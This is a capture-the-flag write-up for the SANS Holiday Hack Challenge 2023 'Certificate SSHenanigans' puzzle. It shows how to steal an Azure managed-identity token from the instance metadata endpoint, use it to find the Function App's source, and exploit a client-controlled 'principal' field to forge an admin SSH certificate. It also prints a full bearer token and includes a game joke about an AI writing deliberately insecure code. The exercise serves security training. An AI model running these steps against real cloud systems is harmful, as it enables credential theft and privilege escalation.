# SANS Holiday Hack Challenge 2023 - Certificate SSHenanigans

## Description

> Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and [Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl). What type of cookie cache is Alabaster planning to implement?

> **Alabaster Snowball (Rainraster Cliffs)**:
*Hello there! Alabaster Snowball at your service.
I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org.
ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea!
It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver!
I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers.
Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list.
If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently.
Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.*

### Hints

> **SSH Certificates Talk**: Check out Thomas Bouve's [talk and demo](https://youtu.be/4S0Rniyidt4) to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.

> **Azure VM Access Token**: Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the [Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) instead.

> **Azure Function App Source Code**: The [get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control) Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.

### Metadata

- Difficulty: 5/5
- Tags: `ssh`, `certificate`, `privesc`, `azure`, `python`

## Solution

### Video

Videos are coming soon! I did not want to put them on GitHub as they are 10 - 100 MBs.
<!-- <video src="media/certificate-sshenanigans.mp4" width='100%' controls playsinline></video> -->

### Write-up

The [web application](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) requires an SSH public key and respond with an SSH certificate with `elf` principal.

We should create an SSH keypair using `ssh-keygen` and submit the public key.

```shell
$ ssh-keygen -Lf elf.crt
elf.crt:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:/waghBAQ+34ZbK1tehL+S9sM4K9IMAJbYfOQqnQlrFQ
        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)
        Key ID: "e13aedbe-053c-49c0-8c64-1260f0a57662"
        Serial: 1
        Valid: from 2024-01-04T22:30:48 to 2024-02-01T22:35:48
        Principals:
                elf
        Critical Options: (none)
        Extensions:
                permit-pty
```

![website.png](media/website.png)

Using the got SSH certificate (e.g.: [elf.crt](files/elf.crt)) we can SSH to the `ssh-server-vm.santaworkshopgeeseislands.org` server as `monitor` user (this was suggested by `Alabaster Snowball`). We can exit the monitoring application with `CTRL+C`.

```bash
$ ssh -i elf.crt -i id_ed25519 monitor@ssh-server-vm.santaworkshopgeeseislands.org
monitor@ssh-server-vm:~$ whoami
monitor
monitor@ssh-server-vm:~$ id
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor),1002(sshallow)
```

Let's check the other principals set up on the server.

```bash
monitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/*
admin
elf
monitor@ssh-server-vm:~$ ls -la /etc/ssh/auth_principals/*
-rw-r--r-- 1 root root 6 Nov  7 21:37 /etc/ssh/auth_principals/alabaster
-rw-r--r-- 1 root root 4 Nov  7 21:37 /etc/ssh/auth_principals/monitor
```

We should somehow get ourselves an SSH certificate with `admin` principal and then we should be able to SSH into the server as `alabaster`.

Let's try to find the source repository of the Azure Function App using the Azure metadata server.

```bash
monitor@ssh-server-vm:/$ curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MTk3MjcsIm5iZiI6MTcwMzYxOTcyNywiZXhwIjoxNzAzNzA2NDI3LCJhaW8iOiJFMlZnWUxqQjgwOWlXbmVYejQyMkZlcStSbnUzQWdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJydEZDNnVtWUxrQzA5SEYzcUtBM0F3IiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Mhg7X39NrmN2PpDyaw8M6eI1ZPYa6WX-eRj3QNMLO9PpaZXqR5_AEIey2m-SNjHImQ0GetexPnmJ8mdVzDNpUWR8ERcrb_ysk6J_q8qujRID6jPlxuuX-wzVZPjF_q-J3IlqZJhOr8ZmSLioBvHuZ9p_Eqmr_xbvJb0LJgNQu_UxevDqf_JaZX65_2KbqXyYV3V6FIw9dDSC7hP8AOH8QOru09rF5mANQm8OurrbHZMpOXYj1H5ajYJ_dYC0Xu2t9NhWQ2erF63xn4ONTiacltJtBt0NXz2xdf7LV7ZmOEUm7kGAvCHzjzybw9ScOtFf5mU5zL26z5fa9EOcmsYIpA",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "85226",
  "expires_on": "1703706427",
  "ext_expires_in": "86399",
  "not_before": "1703619727",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}

monitor@ssh-server-vm:/$ curl -s -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM2MTk3MjcsIm5iZiI6MTcwMzYxOTcyNywiZXhwIjoxNzAzNzA2NDI3LCJhaW8iOiJFMlZnWUxqQjgwOWlXbmVYejQyMkZlcStSbnUzQWdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJydEZDNnVtWUxrQzA5SEYzcUtBM0F3IiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Mhg7X39NrmN2PpDyaw8M6eI1ZPYa6WX-eRj3QNMLO9PpaZXqR5_AEIey2m-SNjHImQ0GetexPnmJ8mdVzDNpUWR8ERcrb_ysk6J_q8qujRID6jPlxuuX-wzVZPjF_q-J3IlqZJhOr8ZmSLioBvHuZ9p_Eqmr_xbvJb0LJgNQu_UxevDqf_JaZX65_2KbqXyYV3V6FIw9dDSC7hP8AOH8QOru09rF5mANQm8OurrbHZMpOXYj1H5ajYJ_dYC0Xu2t9NhWQ2erF63xn4ONTiacltJtBt0NXz2xdf7LV7ZmOEUm7kGAvCHzjzybw9ScOtFf5mU5zL26z5fa9EOcmsYIpA" --noproxy "*" "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" | jq
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
  "name": "northpole-ssh-certs-fa",
  "type": "Microsoft.Web/sites/sourcecontrols",
  "location": "East US",
  "tags": {
    "project": "northpole-ssh-certs",
    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
  },
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    "branch": "main",
    "isManualIntegration": false,
    "isGitHubAction": true,
    "deploymentRollbackEnabled": false,
    "isMercurial": false,
    "provisioningState": "Succeeded",
    "gitHubActionConfiguration": {
      "codeConfiguration": null,
      "containerConfiguration": null,
      "isLinux": true,
      "generateWorkflowFile": true,
      "workflowSettings": {
        "appType": "functionapp",
        "publishType": "code",
        "os": "linux",
        "variables": {
          "runtimeVersion": "3.11"
        },
        "runtimeStack": "python",
        "workflowApiVersion": "2020-12-01",
        "useCanaryFusionServer": false,
        "authType": "publishprofile"
      }
    }
  }
}
```

The URL of the repository is: <https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa> ([northpole-ssh-certs-fa](files/northpole-ssh-certs-fa.zip))

If we analyze the source code (`function_app.py`) and focus on the `principal` variables we will see that the if the HTTP POST request does not contain a `principal` key in the JSON, the `DEFAULT_PRINCIPAL` environment variable is used which is `elf`. 

```python
DEFAULT_PRINCIPAL = os.environ['DEFAULT_PRINCIPAL']
[...]
def parse_input(data) -> Tuple[PublicKey, str]:
    """Parse and validate input parameters."""
    ssh_pub_key = data.get("ssh_pub_key")

    if not ssh_pub_key:
        raise ValidationError("ssh_pub_key field is required.")

    if not isinstance(ssh_pub_key, str):
        raise ValidationError("ssh_pub_key is not a string.")

    ssh_pub_key = ssh_pub_key.strip()
    logging.info("SSH public key: %s", ssh_pub_key)

    if not (ssh_pub_key.lower().startswith("ssh-rsa") or ssh_pub_key.lower().startswith("ssh-ed25519")):
        raise ValidationError("ssh_pub_key is not an RSA or ED25519 SSH public key.")

    principal = data.get("principal", DEFAULT_PRINCIPAL)
[...]
```

This way, we can control `principal` value from client-side. Let's modify the request.

```
POST /api/create-cert?code=candy-cane-twirl HTTP/2
Host: northpole-ssh-certs-fa.azurewebsites.net
Content-Length: 120
Content-Type: application/json
[...]

{"ssh_pub_key":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9i9M2JIITGsFdyFLUeSVlFOyGHaV6J0NlQqls9JoD4", "principal": "admin"}

HTTP/2 200 OK
Content-Type: application/json
Date: Tue, 26 Dec 2023 20:11:56 GMT
Server: Kestrel

{"ssh_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJjE2NjQxNzIyNTA1MTA5ODYxNDY0ODYxMDM4NzU2NDc3ODkxMzYxAAAAIJ9i9M2JIITGsFdyFLUeSVlFOyGHaV6J0NlQqls9JoD4AAAAAAAAAAEAAAABAAAAJGQwN2U5N2E3LTA5NzYtNDM4Mi05ZTY2LThjOTJlMDQwNTUzZgAAAAkAAAAFYWRtaW4AAAAAZYsyYAAAAABlsB2MAAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABA/gOI/U7ewETj6V5iu2pwbegz5BvLbtqMXawvzIpgojJnyjX0uOWubkCvVuYxuDtZRpPBeElj8T9Jl6ekqNHJCw== ", "principal": "admin"}
```

![request](media/request.png)

Now we should be able to SSH into the server as `alabaster` ([admin.crt](files/admin.crt)).

```shell
$ ssh-keygen -Lf admin.crt
admin.crt:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:/waghBAQ+34ZbK1tehL+S9sM4K9IMAJbYfOQqnQlrFQ
        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)
        Key ID: "704db6bb-e2c0-4519-aee6-a596697da1b2"
        Serial: 1
        Valid: from 2024-01-04T22:34:46 to 2024-02-01T22:39:46
        Principals:
                admin
        Critical Options: (none)
        Extensions:
                permit-pty
$ ssh -i admin.crt -i id_ed25519 alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
```

> **Alabaster Snowball (Rainraster Cliffs)**
*Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App.
Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil?
Thanks for the help, I'll go and update the application code immediately!
While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too.
You might be wondering about that SatTrackr tool I've installed on the monitor account?
Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands.
I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us.
No idea what that means yet, but I'm keeping a close eye on that thing!*